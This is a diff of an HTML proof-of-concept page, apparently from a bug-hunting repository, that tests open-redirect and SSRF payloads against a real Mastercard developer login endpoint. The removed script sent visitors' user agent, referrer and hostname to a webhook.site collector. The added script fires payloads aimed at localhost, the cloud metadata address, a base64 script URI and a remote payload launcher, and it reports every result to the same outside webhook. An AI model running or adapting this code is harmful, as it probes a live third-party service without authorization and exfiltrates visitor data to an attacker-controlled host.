@@ -1,11 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
+<h3>Ejecutando pruebas SSRF & redirect...</h3>
 <script>
-fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?proof=executed" +
-  "&ua=" + encodeURIComponent(navigator.userAgent) +
-  "&ref=" + encodeURIComponent(document.referrer) +
-  "&loc=" + encodeURIComponent(location.hostname));
+const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
+const base = "https://developer.mastercard.com/devzone/api/user/login?heracles_operation=AUTHORIZATION&referral_path=";
+
+const tests = [
+  "//juanoviedo28.github.io/mastercard-xss-poc/ssrf-part.html",
+  "//webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?proof=redirect",
+  "//127.0.0.1:80/",
+  "//localhost:8080/",
+  "//169.254.169.254/latest/meta-data/",
+  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // alert(1)
+  "//raw.githubusercontent.com/juanoviedo28/mastercard-xss-poc/main/payload-launcher.html",
+  "https://t.co/xyz123?redirect=https%3A//webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525"
+];
+
+tests.forEach((payload, i) => {
+  fetch(base + encodeURIComponent(payload))
+    .then(r => r.text())
+    .then(txt => fetch(hook + "?result=ok&index=" + i + "&ref=" + encodeURIComponent(payload)))
+    .catch(e => fetch(hook + "?result=fail&index=" + i + "&ref=" + encodeURIComponent(payload) + "&err=" + encodeURIComponent(e.message)));
+});
 </script>
 </body>
 </html>
